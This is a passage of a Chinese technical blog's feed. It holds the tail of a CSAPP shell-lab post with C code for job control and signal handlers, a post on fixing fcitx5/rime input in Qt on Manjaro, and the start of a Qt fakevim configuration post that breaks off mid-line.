class="built_in">printf</span>(<span class="string">&quot;process isn&#x27;t stoped\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kill(job-&gt;pid, SIGCONT);</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 这里的printf后面没有加\n，因为cmdline自带\n</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Note: 因为前台进程结束后，会自动调用chld_handler,所以回收工作交给chld_handler处理</span></span><br><span class="line">    <span class="comment">// 这里只用保证tsh被阻塞即可。</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">    <span class="comment">// 初始化blocking mask</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123; <span class="comment">// 从全局变量jobs中读取 fg pid，避免jobs的竞争</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="keyword">if</span> (!fgpid(jobs))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 没有前台进程</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************</span></span><br><span class="line"><span class="comment"> * Signal handlers</span></span><br><span class="line"><span class="comment"> *****************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">    <span class="keyword">int</span> pid, wstate;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span> <span class="comment">// 触发本次sigchld_handler的job</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    pid = waitpid(<span class="number">-1</span>, &amp;wstate, WNOHANG | WUNTRACED);</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid调用返回有两种情况：</span></span><br><span class="line">    <span class="comment">// 1. 子进程terminate</span></span><br><span class="line">    <span class="comment">// 2. 通过信号，被stop了，如用户键入 ctrl+z</span></span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">    <span class="keyword">if</span> (WIFSTOPPED(wstate))</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">// stoped，更新状态即可</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 不应该在handler中出现printf这类async-unsafe, 替换为safe-library即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, SIGTSTP);</span><br><span class="line">        job-&gt;state = ST;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;   <span class="comment">// terminate，需要deletejob</span></span><br><span class="line">        <span class="keyword">if</span> (WIFSIGNALED(wstate))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 不应该在handler中出现printf这类async-unsafe, 替换为safe-library即可</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, SIGINT);</span><br><span class="line">        &#125;</span><br><span class="line">        deletejob(jobs, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有前台进程, forward to it， 后续处理交给chld_handler</span></span><br><span class="line">    <span class="comment">// 注意传递INT信号可能会造成死循环：具体参考https://blog.csdn.net/guozhiyingguo/article/details/53837424</span></span><br><span class="line">    <span class="comment">// 同时注意，这里kill需要发送给整个进程组</span></span><br><span class="line">    kill(-job-&gt;pid, SIGINT);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有前台进程, forward to it， 后续处理交给chld_handler</span></span><br><span class="line">    kill(job-&gt;pid, SIGTSTP);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment"> * End signal handlers</span></span><br><span class="line"><span class="comment"> *********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************</span></span><br><span class="line"><span class="comment"> * Helper routines that manipulate the job list</span></span><br><span class="line"><span class="comment"> **********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    job-&gt;pid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;jid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;state = UNDEF;</span><br><span class="line">    job-&gt;cmdline[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* initjobs - Initialize the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        clearjob(&amp;jobs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maxjid - Returns largest allocated job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, max = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].jid &gt; max)</span><br><span class="line">            max = jobs[i].jid;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* addjob - Add a job to the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            jobs[i].pid = pid;</span><br><span class="line">            jobs[i].state = state;</span><br><span class="line">            jobs[i].jid = nextjid++;</span><br><span class="line">            <span class="keyword">if</span> (nextjid &gt; MAXJOBS)</span><br><span class="line">                nextjid = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(jobs[i].cmdline, cmdline);</span><br><span class="line">            <span class="keyword">if</span> (verbose)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tried to create too many jobs\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* deletejob - Delete a job whose PID=pid from the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">        &#123;</span><br><span class="line">            clearjob(&amp;jobs[i]);</span><br><span class="line">            nextjid = maxjid(jobs) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].state == FG)</span><br><span class="line">            <span class="keyword">return</span> jobs[i].pid;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobpid  - Find a job (by PID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">            <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobjid  - Find a job (by JID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (jid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].jid == jid)</span><br><span class="line">            <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pid2jid - Map process ID to job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> jobs[i].jid;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* listjobs - Print the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);</span><br><span class="line">            <span class="keyword">switch</span> (jobs[i].state)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> BG:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Running &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FG:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Foreground &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ST:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Stopped &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>,</span><br><span class="line">                       i, jobs[i].state);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, jobs[i].cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************</span></span><br><span class="line"><span class="comment"> * end job list helper routines</span></span><br><span class="line"><span class="comment"> ******************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************</span></span><br><span class="line"><span class="comment"> * Other helper routines</span></span><br><span class="line"><span class="comment"> ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * usage - print a help message</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: shell [-hvp]\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -h   print this message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -v   print additional diagnostic information\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -p   do not emit a command prompt\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * unix_error - unix-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app_error - application-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal - wrapper for the sigaction function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;</span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Signal error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigquit_handler - The driver program can gracefully terminate the</span></span><br><span class="line"><span class="comment"> *    child shell by sending it a SIGQUIT signal.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次lab, shlab. 即编写一个简单的shell。&lt;/p&gt;
&lt;h2 id=&quot;0-背景知识&quot;&gt;&lt;a href=&quot;#0-背景知识&quot; class=&quot;headerlink&quot; title=&quot;0. 背景知识&quot;&gt;&lt;/a&gt;0. 背景知识&lt;/h2&gt;&lt;p&gt;shlab相对其它lab要简单一些，但是其中牵涉出来的一些概念是相当难的。简单说一下这次lab依赖的背景知识吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;书籍对应 异常控制流 章节&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;理解进程的概念，linux如何创建新进程，进程的状态转换，回收等过程。&lt;/li&gt;
&lt;li&gt;理解linux中的signal概念，掌握如何发送、接收、处理signal事件，理解signal handler中的 &lt;strong&gt;Async-Signal-Safety问题及解决方案（也是本次实验的难点）&lt;/strong&gt; ，掌握async-signal-safety的guideline.&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="shlab" scheme="https://www.ravenxrz.ink/tags/shlab/"/>
    
  </entry>
  
  <entry>
    <title>linux下rime输入法无法在qt中输入的解决办法</title>
    <link href="https://www.ravenxrz.ink/archives/167d6ba3.html"/>
    <id>https://www.ravenxrz.ink/archives/167d6ba3.html</id>
    <published>2020-08-11T11:33:51.000Z</published>
    <updated>2020-09-06T07:37:36.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>今天在manjaro下做qt开发时，发现fcitx-rime输入法无法在qtcreator中输入，google了一波，发现应该是差了某个动态库，网上的发行版大多以debian系列为主，apt安装个包就完了，arch系列不是这样解决的。</p><a id="more"></a><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>继续看arch的wiki，搜索fcitx qt等关键词后，发现现在arch都使用的fcitx5了，fcitx5有qt的插件，能够完美解决这些这些问题，具体来说，卸载以前的旧版本fcitx，安装以下包：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f22402714195aa594ef0f0e.png" alt="image-20200730113135729"></p><p>参照arch的wiki，安装这些包后，还需要配置环境变量：</p><p>vim ~/.pam_environment </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INPUT_METHOD  DEFAULT=fcitx5</span><br><span class="line">GTK_IM_MODULE DEFAULT=fcitx5</span><br><span class="line">QT_IM_MODULE  DEFAULT=fcitx5</span><br><span class="line">XMODIFIERS    DEFAULT=@im=fcitx5</span><br></pre></td></tr></table></figure><p>要开机自启动fcitx，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/applications/fcitx5.desktop ~/.config/autostart</span><br></pre></td></tr></table></figure><p>注销后重新登录，打开fcitx5配置GUI：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f224cc914195aa594f584e9.png" alt="image-20200730113337696"></p><p>rime的配置文件路径也变了，具体路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;.local&#x2F;share&#x2F;fcitx5&#x2F;rime</span><br></pre></td></tr></table></figure><p>最后一个问题，<strong>修改候选框的字体大小</strong>，这个我找了很久：</p><p><img data-src="https://pic.downk.cc/item/5f22404814195aa594ef2114.png" alt="image-20200730113538459"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;今天在manjaro下做qt开发时，发现fcitx-rime输入法无法在qtcreator中输入，google了一波，发现应该是差了某个动态库，网上的发行版大多以debian系列为主，apt安装个包就完了，arch系列不是这样解决的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂文" scheme="https://www.ravenxrz.ink/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="输入法" scheme="https://www.ravenxrz.ink/tags/%E8%BE%93%E5%85%A5%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Qt 配置+fakevim自定义</title>
    <link href="https://www.ravenxrz.ink/archives/afbe8180.html"/>
    <id>https://www.ravenxrz.ink/archives/afbe8180.html</id>
    <published>2020-08-10T11:29:53.000Z</published>
    <updated>2020-09-06T07:37:36.758Z</updated>
    
    <content type="html"><![CDATA[<p>项目原因，要写点qt代码。记录下个人配置：</p><a id="more"></a><ol><li>高分屏下字体过小问题</li></ol><p><img data-src="https://pic.downk.cc/item/5f1a50e514195aa594c27812.jpg"></p><ol start="2"><li>上下文帮助菜单（即快捷键F1）字体过小问题：</li></ol><p>目前在manjaro-gnome上通过更改字体大小无效，只能更改渲染引擎，然后再更改字体大小，才能生效。</p><p><img data-src="https://pic.downk.cc/item/5f1a512214195aa594c29044.jpg"></p><ol start="3"><li>fakevim配置</li></ol><p><img data-src="https://pic.downk.cc/item/5f1a524414195aa594c3099c.jpg"></p><p>注意右边有个传递Control按键，开启这个选项后，能够使系统自带的一些快捷键（如Ctrl+R,Ctrl+O)和vim的一些特性共同使用。 但是就我个人而言，这样会失去一些vim的快捷键，所以未开启。</p><p>如果不开启传递Control， 那么Ctrl+R，Ctrl+F等常用qtcreator的快捷键又无法使用，好在fakevim支持vimrc，也支持定义ex command，所以可以自行配置vimrc来做键位mapping。下面以 “Run“命令为例，讲解如何配置vimrc。</p><p>打开Fakevim的ex command mapping:</p><p><img data-src="https://pic.downk.cc/item/5f1a535914195aa594c3663f.jpg"></p><p>然后打开你的vimrc，（个人为qt新建了一个配置文件，放在~/.qtvimrc下）</p><p>写上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; run operation</span><br><span class="line">map ;r 